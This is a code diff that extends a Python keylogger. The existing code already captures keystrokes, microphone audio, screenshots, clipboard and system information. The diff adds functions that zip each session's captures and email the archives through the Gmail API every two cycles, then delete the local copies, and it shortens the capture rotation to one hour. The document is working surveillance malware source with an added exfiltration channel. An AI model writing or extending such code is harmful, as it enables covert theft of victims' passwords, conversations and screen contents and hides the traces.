@@ -29,6 +29,22 @@ import datetime
 # For multithreading
 import threading
 
+# For handling file paths
+from pathlib import Path
+
+# For email handling
+from email.message import EmailMessage
+import mimetypes
+import base64
+
+# For Gmail API
+from google.oauth2.credentials import Credentials
+from googleapiclient.discovery import build
+from googleapiclient.errors import HttpError
+
+# Define the required scopes for Gmail API
+scopes = ["https://www.googleapis.com/auth/gmail.send"]
+
 import shutil
 
 load_dotenv()
@@ -155,7 +171,7 @@ def capture_microphone(threshold, dir):
                         volume_level = numpy.mean(numpy.abs(audio_chunk))
                         
                         if volume_level >= threshold:
-                            buffer.append(audio_chunk.tobytes())  # ✅ Convert to bytes
+                            buffer.append(audio_chunk.tobytes())  # Convert to bytes
                             recording_has_sound = True
                             silence_start = None
                         elif recording_has_sound:
@@ -194,23 +210,74 @@ def capture_screenshot(dir):
         im.save(screenshot)
         time.sleep(1800)
 
+results_dir = Path("Results")
+results_dir.mkdir(exist_ok=True)
 def create_output_folders(dir):
+    global results_dir
     paths = {
-        "keylogs": get_filename("keylogs", f"{dir}\\"),
-        "screenshots": get_filename("screenshots", f"{dir}\\"),
-        "audio": get_filename("audio", f"{dir}\\"),
-        "clipboard": get_filename("clipboard", f"{dir}\\"),
-        "sysinfo": get_filename("sysinfo", f"{dir}\\")
+        "keylogs": get_filename("keylogs", f"{results_dir}\\{dir}\\"),
+        "screenshots": get_filename("screenshots", f"{results_dir}\\{dir}\\"),
+        "audio": get_filename("audio", f"{results_dir}\\{dir}\\"),
+        "clipboard": get_filename("clipboard", f"{results_dir}\\{dir}\\"),
+        "sysinfo": get_filename("sysinfo", f"{results_dir}\\{dir}\\")
     }
-    os.makedirs(get_filename(dir), exist_ok=True)
+
     for path in paths.values():
         os.makedirs(path, exist_ok=True)
     return paths
 
+def gmail_create_message_with_attachment(toaddr):
+    fromaddr = os.environ.get("EMAIL_ADDRESS", "null")
+    if fromaddr == "null":
+        return None
+    
+    try:
+        mime_message = EmailMessage()
+
+        mime_message["To"] = toaddr
+        mime_message["From"] = fromaddr
+        mime_message["Subject"] = f"KeyLogger_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
+
+        mime_message.set_content("Hi, this is an automated mail with an attachment. Please do not reply.")
+
+        for attachment_filename in list(results_dir.glob("*.zip")):
+            type_subtype, _ = mimetypes.guess_type(attachment_filename)
+            if type_subtype:
+                maintype, subtype = type_subtype.split("/")
+            else:
+                maintype, subtype = "application", "octet-stream"  # Default type
+
+            with open(attachment_filename, "rb") as fp:
+                attachment_data = fp.read()
+        
+            mime_message.add_attachment(attachment_data, maintype, subtype, filename=os.path.basename(attachment_filename))
+
+        encoded_message = base64.urlsafe_b64encode(mime_message.as_bytes()).decode()
+        return encoded_message
+    except Exception as error:
+        print(f"An error occurred while creating message: {error}")
+        return None
+
+def gmail_send_message(encoded_message):
+    # Sends an email via Gmail API.
+    creds = Credentials.from_authorized_user_file(os.environ.get("TOKEN_FILE"), scopes)
+    try:
+        service = build("gmail", "v1", credentials=creds)
+
+        create_message = {"raw": encoded_message}
+        
+        send_message = service.users().messages().send(userId="me", body=create_message).execute()
+        print(f'Message ID: {send_message["id"]}')
+    except HttpError as error:
+        print(f"An error occurred: {error}")
+
 previous_dir = None
+cycle_count = 0
 
 def start_keylogging():
-    global previous_dir, active_listener
+
+    global previous_dir, active_listener, cycle_count
+    cycle_count += 1
     new_dir = f"result_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
     results = create_output_folders(new_dir)
     
@@ -231,7 +298,8 @@ def start_keylogging():
     # remove previous directory to save space
     if previous_dir:
         try:
-            zip_path = os.path.abspath(previous_dir)
+            full_prev_dir = results_dir / previous_dir
+            zip_path = full_prev_dir.resolve()  # Full path for archiving
             print(zip_path)
             shutil.make_archive(zip_path, format="zip", root_dir=zip_path)
             shutil.rmtree(zip_path)
@@ -241,7 +309,27 @@ def start_keylogging():
 
     previous_dir = new_dir
 
-# Loop every 2 hours to rotate session
+    # Every two cycles, send files through email and cleanup
+    if cycle_count % 2 == 0:
+        toaddr = os.environ.get("EMAIL_ADDRESS")
+        encoded_email = gmail_create_message_with_attachment(toaddr)
+        if encoded_email:
+            gmail_send_message(encoded_email)
+            print("Email sent successfully.")
+
+            for item in results_dir.iterdir():
+                try:
+                    if item.is_file() or item.suffix == ".zip":
+                        item.unlink()
+                    elif item.is_dir():
+                        shutil.rmtree(item)
+                except Exception as e:
+                    print(f"Could not delete {item}: {e}")
+                
+        else:
+            print("Email sending failed.")
+
+# Loop every 1 hour to rotate session
 while True:
     start_keylogging()
-    time.sleep(7200)  # 2 hours = 7200 seconds
+    time.sleep(3600)  # 1 hours = 3600 seconds
